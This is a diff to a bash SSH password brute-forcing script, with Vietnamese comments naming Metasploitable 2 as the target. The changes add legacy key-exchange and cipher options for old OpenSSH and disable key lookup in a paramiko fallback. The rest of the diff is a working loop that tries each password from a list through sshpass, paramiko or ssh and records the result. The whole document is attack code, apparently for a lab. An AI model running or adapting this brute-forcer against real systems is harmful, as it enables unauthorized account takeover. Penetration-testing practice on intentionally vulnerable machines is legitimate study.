@@ -55,17 +55,16 @@ echo "Timestamp: $(date -Is)" > "$OUTPUT_FILE"
 echo "Target: $TARGET_IP | User: $TARGET_USER" >> "$OUTPUT_FILE"
 echo "----------------------------------------------------------" >> "$OUTPUT_FILE"
 
+# Tham số tương thích ngược cho OpenSSH cũ trên Metasploitable 2 (OpenSSH 4.7p1)
+SSH_COMPAT_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -o NumberOfPasswordPrompts=1 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1 -o Ciphers=+aes128-cbc,3des-cbc"
+
 count=1
 for pass in "${PASSWORDS[@]}"; do
     echo -ne "[$count/${#PASSWORDS[@]}] Thu mat khau: '${YELLOW}$pass${NC}' ... "
     
     # 1. Thu bang sshpass
     if command -v sshpass >/dev/null 2>&1; then
-        res=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
-                                    -o UserKnownHostsFile=/dev/null \
-                                    -o ConnectTimeout=3 \
-                                    -o NumberOfPasswordPrompts=1 \
-                                    "$TARGET_USER@$TARGET_IP" 2>&1)
+        res=$(sshpass -p "$pass" ssh $SSH_COMPAT_OPTS "$TARGET_USER@$TARGET_IP" 2>&1)
     # 2. Fallback sang Python Paramiko neu khong co sshpass
     elif python3 -c "import paramiko" >/dev/null 2>&1; then
         res=$(python3 -c "
@@ -73,7 +72,7 @@ import paramiko, socket
 try:
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect('$TARGET_IP', port=22, username='$TARGET_USER', password='$pass', timeout=3)
+    client.connect('$TARGET_IP', port=22, username='$TARGET_USER', password='$pass', timeout=3, allow_agent=False, look_for_keys=False)
     print('SUCCESS')
     client.close()
 except paramiko.AuthenticationException:
@@ -83,7 +82,7 @@ except Exception as e:
 " 2>&1)
     # 3. Fallback sang netcat/curl/ssh co timeout
     else
-        res=$(timeout 3 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 "$TARGET_USER@$TARGET_IP" 2>&1)
+        res=$(timeout 3 ssh $SSH_COMPAT_OPTS "$TARGET_USER@$TARGET_IP" 2>&1)
     fi
 
     # Danh gia ket qua
